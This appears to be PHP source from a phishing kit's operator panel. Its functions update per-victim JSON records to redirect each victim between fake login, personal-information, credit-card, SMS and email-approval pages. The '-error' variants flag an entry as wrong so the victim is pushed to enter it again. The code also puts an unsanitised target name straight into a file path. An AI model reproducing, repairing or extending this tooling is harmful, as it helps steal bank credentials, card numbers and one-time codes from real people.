<?php

    function added($target, $to) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to;
        if($to === "login"){
            $user_data['error_login'] = 0;
        }
        elseif($to === "login-error"){
            $user_data['error_login'] = 1;
        }
        elseif($to === "information"){
            $user_data['error_information'] = 0;
        }
        elseif($to === "information-error"){
            $user_data['error_information'] = 1;
        }
        elseif($to === "credit-card"){
            $user_data['error_credit_card'] = 0;
        }
        elseif($to === "credit-card-error"){
            $user_data['error_credit_card'] = 1;
        }
        elseif($to === "sms"){
            $user_data['error_sms'] = 0;
        }
        elseif($to === "sms-error"){
            $user_data['error_sms'] = 1;
        }
        elseif($to === "approvation-email"){
            $user_data['error_approvation_email'] = 0;
        }
        elseif($to === "approvation-email-error"){
            $user_data['error_approvation_email'] = 1;
        }
        elseif($to === "approvation-sms"){
            $user_data['error_approvation_sms'] = 0;
        }
        elseif($to === "approvation-sms-error"){
            $user_data['error_approvation_sms'] = 1;
        }
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other($target, $to, $current_page, $userStatus) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $user_data['current_page'] = $current_page; 
        $user_data['userStatus'] = $userStatus; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

?>